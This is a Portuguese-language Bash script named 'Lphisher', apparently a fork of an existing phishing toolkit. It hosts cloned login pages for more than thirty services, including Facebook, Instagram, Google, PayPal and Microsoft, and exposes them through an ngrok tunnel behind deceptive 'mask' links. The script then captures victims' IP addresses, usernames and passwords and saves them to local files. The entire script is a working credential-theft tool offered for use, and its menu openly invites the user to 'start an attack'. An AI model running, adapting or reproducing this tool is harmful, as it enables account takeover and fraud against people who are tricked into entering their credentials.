#!/bin/bash

##   Lphisher 	: 	Ferramenta Phishing Avançada
##   Author 	: 	MP Server Inc. 2021 
##   Version 	: 	1.0
##   Github 	: 	https://github.com/SukunaBR

##   THANKS TO :
##   Sukuna BR - https://github.com/SukunaBR
##   Moises Tapia - https://github.com/MoisesTapia
##   TheLinuxChoice - https://twitter.com/linux_choice
##   DarksecDevelopers  - https://github.com/DarksecDevelopers
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Võ Ngọc Bảo - https://github.com/vongocbao
##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009


## Se você copiar, dê os créditos :)


## LICENÇA PÚBLICA GERAL GNU
## Versão 3, 29 de junho de 2007
##
## Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
## Todos estão autorizados a copiar e distribuir cópias literais
## deste documento de licença, mas não é permitido alterá-lo.
##
## Preâmbulo
##
## A GNU General Public License é uma licença copyleft gratuita para
## software e outros tipos de trabalhos.
##
## As licenças para a maioria dos softwares e outros trabalhos práticos são projetadas
## para tirar sua liberdade de compartilhar e alterar as obras. Por contraste,
## a GNU General Public License se destina a garantir a sua liberdade de
## compartilhar e alterar todas as versões de um programa - para garantir que ele permaneça gratuito
## software para todos os seus usuários. Nós, a Free Software Foundation, usamos o
## Licença Pública Geral GNU para a maioria de nosso software; aplica-se também a
## qualquer outro trabalho divulgado desta forma por seus autores. Você pode aplicá-lo a
## seus programas também.
##
## Quando falamos de software livre, estamos nos referindo à liberdade, não
##    preço. Nossas Licenças Públicas Gerais são projetadas para garantir que você
## tem a liberdade de distribuir cópias de software livre (e cobrar por
## se desejar), que você receberá o código-fonte ou poderá obtê-lo se você
## deseja, que você pode alterar o software ou usar partes dele em novos
## programas gratuitos, e que você sabe que pode fazer essas coisas.
##
## Para proteger seus direitos, precisamos impedir que outros neguem você
## esses direitos ou pedindo a você que renuncie a eles. Portanto, você tem
## certas responsabilidades se você distribuir cópias do software, ou se
## você modifica: responsabilidades de respeitar a liberdade dos outros.
##
## Por exemplo, se você distribuir cópias de tal programa, seja
## grátis ou por uma taxa, você deve repassar aos destinatários o mesmo
## liberdades que você recebeu. Você deve se certificar de que eles também recebam
## ou pode obter o código-fonte. E você deve mostrar a eles esses termos para que eles
## conhece seus direitos.
##
## Os desenvolvedores que usam a GNU GPL protegem seus direitos com duas etapas:
## (1) reivindicar direitos autorais sobre o software, e (2) oferecer a você esta Licença
## dando a você permissão legal para copiar, distribuir e / ou modificá-lo.
##
## Para a proteção dos desenvolvedores e autores, a GPL explica claramente
## que não há garantia para este software gratuito. Para os usuários e
## por causa dos autores, a GPL requer que as versões modificadas sejam marcadas como
## alterado, de modo que seus problemas não sejam atribuídos erroneamente a
## autores de versões anteriores.
##
## Alguns dispositivos são projetados para negar aos usuários o acesso para instalar ou executar
## modificou versões do software dentro delas, embora o fabricante
## pode fazer isso. Isso é fundamentalmente incompatível com o objetivo de
## protegendo a liberdade dos usuários de alterar o software. O sistemático
## padrão de tal abuso ocorre na área de produtos para os indivíduos
## use, que é precisamente onde é mais inaceitável. Portanto, nós
## projetou esta versão da GPL para proibir a prática para aqueles
## produtos. Se esses problemas surgirem substancialmente em outros domínios, nós
## estão prontos para estender esta disposição a esses domínios em versões futuras
## da GPL, conforme necessário para proteger a liberdade dos usuários.
##
## Finalmente, todo programa é constantemente ameaçado por patentes de software.
## Os Estados não devem permitir que as patentes restrinjam o desenvolvimento e o uso de
## software em computadores de uso geral, mas naqueles que o fazem, desejamos
## evitar o perigo especial de que patentes aplicadas a um programa gratuito possam
## torná-lo efetivamente proprietário. Para evitar isso, a GPL garante que
## patentes não podem ser usadas para tornar o programa não-livre.
##
## Os termos e condições precisos para cópia, distribuição e
## modificação a seguir.
##
##      Copyright (C) 2021 MP Server Inc. (https://github.com/SukunaBR)
##


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Finalizado." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} _           _           _               
		${ORANGE}| |         | |         | |              
		${ORANGE}| |    _ __ | |__  _ ___| |__   ___ _ __ 
		${ORANGE}| |   | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE}| |___| |_) | | | | \__ \ | | |  __/ |   
		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
		${ORANGE}      | |                                
		${ORANGE}      |_|                ${RED}Version : 1.0

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Modded by MP Server Inc. (tahmid.rayat)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}    █▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLUE}  L █▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLUE}    ▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 1.0
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando arquivos necessários..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacotes : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes ja estão instalados."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Pacotes : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes não suportados, instalar pacotes manualmente."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Downloading Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro, instale Ngrok manualmente."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok ja está instalado."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Tenha um bom dia :)${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}SUKUNA BR 2021 ${RED}[ ${ORANGE}MP Server Inc. ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/SukunaBR
		${GREEN}Version  ${RED}:  ${ORANGE}1.0

		${REDBG}${WHITE} Thanks : SukunaBR,MP Server Inc.

		${RED}[${WHITE}00${RED}]${ORANGE} Menu Principal    ${RED}[${WHITE}99${RED}]${ORANGE} Sair

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu principal..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção Inválida, Tente Novamente..."
		{ sleep 1; about; }
	fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Configurando Servidor..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Iniciando Servidor PHP..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Endereço IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Login : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Senha : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando a próxima informação de login, ${BLUE}Ctrl + C ${ORANGE}para sair... "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando informações de login, ${BLUE}Ctrl + C ${ORANGE}para sair..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} IP Localizado !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Informação Obtida !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Iniciando Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to MP Server Inc. (https://github.com/SukunaBR)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Link 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Link 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hospedado com sucesso em : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}Nao Usar${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Melhor${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione um serviço de porta : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção Inválida, Tente Novamente..."
		{ sleep 1; tunnel_menu; }
	fi
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
		${RED}[${WHITE}02${RED}]${ORANGE} Página de login de votação avançada
		${RED}[${WHITE}03${RED}]${ORANGE} Página de login de segurança falsa
		${RED}[${WHITE}04${RED}]${ORANGE} Página de login Facebook Messenger

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://facebook-security'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		mask='http://facebook-voting'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_security"
		mask='http://facebook-new-security'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="fb_messenger"
		mask='http://facebook-messenger'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção Inválida, Tente Novamente..."
		{ sleep 1; clear; banner_small; site_facebook; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
		${RED}[${WHITE}02${RED}]${ORANGE} Página de login de seguidores
		${RED}[${WHITE}03${RED}]${ORANGE} Página de login 1000 seguidores
		${RED}[${WHITE}04${RED}]${ORANGE} Página de login verificar crachá

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://instagram-login'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://auto-followers'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="insta_followers"
		mask='http://instagram-seguidores'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="ig_verify"
		mask='http://instagram-crachá'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção Inválida, Tente Novamente..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Antiga página de login do Gmail
		${RED}[${WHITE}02${RED}]${ORANGE} Nova página de login do Gmail
		${RED}[${WHITE}03${RED}]${ORANGE} Página de votação avançada

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://gmail-security'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://google-mail'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://google-pesquisa'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção Inválida, Tente Novamente..."
		{ sleep 1; clear; banner_small; site_gmail; }
	fi
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
		${RED}[${WHITE}02${RED}]${ORANGE} Página de votação avançada

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="vk"
		mask='http://vk-premium'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="vk_poll"
		mask='http://vk-vote'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção Inválida, Tente Novamente..."
		{ sleep 1; clear; banner_small; site_vk; }
	fi
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} SELECIONE UMA PÁGINA PARA INICIAR ATAQUE ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Xiaomi       ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github

		${RED}[${WHITE}99${RED}]${ORANGE} Sobre        ${RED}[${WHITE}00${RED}]${ORANGE} Sair

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Qual Opção Deseja Escolher : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_facebook
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		site_gmail
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="microsoft"
		mask='http://microsoft-login'
		tunnel_menu
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="netflix"
		mask='http://netflix-upgrade'
		tunnel_menu
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="paypal"
		mask='http://paypal-com'
		tunnel_menu
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="steam"
		mask='http://steam-game'
		tunnel_menu
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="twitter"
		mask='http://twitter-com'
		tunnel_menu
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="playstation"
		mask='http://ps-store'
		tunnel_menu
	elif [[ "$REPLY" == 10 ]]; then
		website="tiktok"
		mask='http://tiktok-followers'
		tunnel_menu
	elif [[ "$REPLY" == 11 ]]; then
		website="twitch"
		mask='http://twitch-video'
		tunnel_menu
	elif [[ "$REPLY" == 12 ]]; then
		website="pinterest"
		mask='http://get-photos'
		tunnel_menu
	elif [[ "$REPLY" == 13 ]]; then
		website="snapchat"
		mask='http://snapchat-download'
		tunnel_menu
	elif [[ "$REPLY" == 14 ]]; then
		website="linkedin"
		mask='http://premium-link'
		tunnel_menu
	elif [[ "$REPLY" == 15 ]]; then
		website="ebay"
		mask='http://ebay-brasil'
		tunnel_menu
	elif [[ "$REPLY" == 16 ]]; then
		website="quora"
		mask='http://quora-premium'
		tunnel_menu
	elif [[ "$REPLY" == 17 ]]; then
		website="xiaomi"
		mask='http://xiaomi-com'
		tunnel_menu
	elif [[ "$REPLY" == 18 ]]; then
		website="spotify"
		mask='http://spotify-premium'
		tunnel_menu
	elif [[ "$REPLY" == 19 ]]; then
		website="reddit"
		mask='http://reddit-official'
		tunnel_menu
	elif [[ "$REPLY" == 20 ]]; then
		website="adobe"
		mask='http://get-adobe'
		tunnel_menu
	elif [[ "$REPLY" == 21 ]]; then
		website="deviantart"
		mask='http://get-500-usd'
		tunnel_menu
	elif [[ "$REPLY" == 22 ]]; then
		website="badoo"
		mask='http://get-500-usd'
		tunnel_menu
	elif [[ "$REPLY" == 23 ]]; then
		website="origin"
		mask='http://origin-ea'
		tunnel_menu
	elif [[ "$REPLY" == 24 ]]; then
		website="dropbox"
		mask='http://free-storage'
		tunnel_menu
	elif [[ "$REPLY" == 25 ]]; then
		website="yahoo"
		mask='http://yahoo-brasil'
		tunnel_menu
	elif [[ "$REPLY" == 26 ]]; then
		website="wordpress"
		mask='http://unlimited-word'
		tunnel_menu
	elif [[ "$REPLY" == 27 ]]; then
		website="yandex"
		mask='http://yandex-account'
		tunnel_menu
	elif [[ "$REPLY" == 28 ]]; then
		website="stackoverflow"
		mask='http://get-stackoverflow'
		tunnel_menu
	elif [[ "$REPLY" == 29 ]]; then
		site_vk
	elif [[ "$REPLY" == 30 ]]; then
		website="xbox"
		mask='http://get-500-usd-free'
		tunnel_menu
	elif [[ "$REPLY" == 31 ]]; then
		website="mediafire"
		mask='http://mediafire-free'
		tunnel_menu
	elif [[ "$REPLY" == 32 ]]; then
		website="gitlab"
		mask='http://gitlab-free'
		tunnel_menu
	elif [[ "$REPLY" == 33 ]]; then
		website="github"
		mask='http://github-free'
		tunnel_menu
	elif [[ "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção Inválida, Tente Novamente..."
		{ sleep 1; main_menu; }
	fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu
